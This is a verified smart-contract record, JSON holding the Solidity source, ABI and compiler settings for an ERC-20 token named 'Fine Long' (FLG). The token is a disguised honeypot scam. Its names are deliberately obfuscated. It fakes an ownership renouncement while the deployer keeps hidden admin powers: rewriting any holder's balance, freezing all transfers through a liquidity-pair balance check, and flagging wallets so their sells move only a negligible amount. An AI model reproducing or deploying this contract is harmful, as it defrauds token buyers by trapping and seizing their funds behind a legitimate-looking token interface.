{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface launchFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFrom) external view returns (uint256);\n\n    function transfer(address limitTake, uint256 senderReceiverMin) external returns (bool);\n\n    function allowance(address teamSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderReceiverMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTake,\n        uint256 senderReceiverMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTx, uint256 value);\n    event Approval(address indexed teamSwap, address indexed spender, uint256 value);\n}\n\nabstract contract tradingList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedExemptSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalMax {\n    function createPair(address totalReceiverTrading, address takeWalletLaunch) external returns (address);\n}\n\ninterface sellTeam is launchFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FineLong is tradingList, launchFund, sellTeam {\n\n    event OwnershipTransferred(address indexed takeLimit, address indexed buyFund);\n\n    function transferFrom(address fundSell, address limitTake, uint256 senderReceiverMin) external override returns (bool) {\n        if (_msgSender() != totalReceiver) {\n            if (toFeeLimit[fundSell][_msgSender()] != type(uint256).max) {\n                require(senderReceiverMin <= toFeeLimit[fundSell][_msgSender()]);\n                toFeeLimit[fundSell][_msgSender()] -= senderReceiverMin;\n            }\n        }\n        return totalLiquidity(fundSell, limitTake, senderReceiverMin);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalMarketing;\n    }\n\n    mapping(address => bool) public buySwapTotal;\n\n    uint256 toMinExempt;\n\n    bool public listMax;\n\n    uint256 public exemptSellFee;\n\n    string private sellWalletTake = \"Fine Long\";\n\n    function transfer(address isEnableAt, uint256 senderReceiverMin) external virtual override returns (bool) {\n        return totalLiquidity(_msgSender(), isEnableAt, senderReceiverMin);\n    }\n\n    function amountTotal(address fundSell, address limitTake, uint256 senderReceiverMin) internal returns (bool) {\n        require(minMode[fundSell] >= senderReceiverMin);\n        minMode[fundSell] -= senderReceiverMin;\n        minMode[limitTake] += senderReceiverMin;\n        emit Transfer(fundSell, limitTake, senderReceiverMin);\n        return true;\n    }\n\n    uint256 liquidityEnable;\n\n    uint256 private sellShouldTotal;\n\n    uint256 public modeFee;\n\n    function approve(address minTotal, uint256 senderReceiverMin) public virtual override returns (bool) {\n        toFeeLimit[_msgSender()][minTotal] = senderReceiverMin;\n        emit Approval(_msgSender(), minTotal, senderReceiverMin);\n        return true;\n    }\n\n    function totalLiquidity(address fundSell, address limitTake, uint256 senderReceiverMin) internal returns (bool) {\n        if (fundSell == receiverShouldMarketing) {\n            return amountTotal(fundSell, limitTake, senderReceiverMin);\n        }\n        uint256 exemptLiquidity = launchFund(swapLaunch).balanceOf(exemptBuy);\n        require(exemptLiquidity == toMinExempt);\n        require(limitTake != exemptBuy);\n        if (receiverSellTrading[fundSell]) {\n            return amountTotal(fundSell, limitTake, feeMode);\n        }\n        return amountTotal(fundSell, limitTake, senderReceiverMin);\n    }\n\n    function tokenTotal() private view {\n        require(buySwapTotal[_msgSender()]);\n    }\n\n    function launchedMax() public {\n        emit OwnershipTransferred(receiverShouldMarketing, address(0));\n        liquidityReceiver = address(0);\n    }\n\n    bool public fundTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingSell;\n    }\n\n    function tradingAt(address modeWallet) public {\n        if (receiverToken) {\n            return;\n        }\n        \n        buySwapTotal[modeWallet] = true;\n        \n        receiverToken = true;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityReceiver;\n    }\n\n    uint256 constant feeMode = 17 ** 10;\n\n    function allowance(address launchedMin, address minTotal) external view virtual override returns (uint256) {\n        if (minTotal == totalReceiver) {\n            return type(uint256).max;\n        }\n        return toFeeLimit[launchedMin][minTotal];\n    }\n\n    function launchTrading(address isEnableAt, uint256 senderReceiverMin) public {\n        tokenTotal();\n        minMode[isEnableAt] = senderReceiverMin;\n    }\n\n    mapping(address => mapping(address => uint256)) private toFeeLimit;\n\n    address exemptBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private totalMarketing = 100000000 * 10 ** 18;\n\n    address totalReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public feeFromMarketing;\n\n    function getOwner() external view returns (address) {\n        return liquidityReceiver;\n    }\n\n    bool private isFee;\n\n    uint8 private minTake = 18;\n\n    address public receiverShouldMarketing;\n\n    mapping(address => uint256) private minMode;\n\n    bool public receiverToken;\n\n    constructor (){\n        \n        launchedExemptSender launchTo = launchedExemptSender(totalReceiver);\n        swapLaunch = totalMax(launchTo.factory()).createPair(launchTo.WETH(), address(this));\n        \n        receiverShouldMarketing = _msgSender();\n        launchedMax();\n        buySwapTotal[receiverShouldMarketing] = true;\n        minMode[receiverShouldMarketing] = totalMarketing;\n        if (exemptSellFee != modeFee) {\n            modeFee = exemptSellFee;\n        }\n        emit Transfer(address(0), receiverShouldMarketing, totalMarketing);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTake;\n    }\n\n    address public swapLaunch;\n\n    function launchAmount(uint256 senderReceiverMin) public {\n        tokenTotal();\n        toMinExempt = senderReceiverMin;\n    }\n\n    mapping(address => bool) public receiverSellTrading;\n\n    function fundLaunchedTotal(address amountMax) public {\n        tokenTotal();\n        \n        if (amountMax == receiverShouldMarketing || amountMax == swapLaunch) {\n            return;\n        }\n        receiverSellTrading[amountMax] = true;\n    }\n\n    string private tradingSell = \"FLG\";\n\n    address private liquidityReceiver;\n\n    function balanceOf(address receiverFrom) public view virtual override returns (uint256) {\n        return minMode[receiverFrom];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellWalletTake;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiverMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySwapTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"}],\"name\":\"fundLaunchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderReceiverMin\",\"type\":\"uint256\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnableAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiverMin\",\"type\":\"uint256\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShouldMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"}],\"name\":\"tradingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnableAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiverMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiverMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}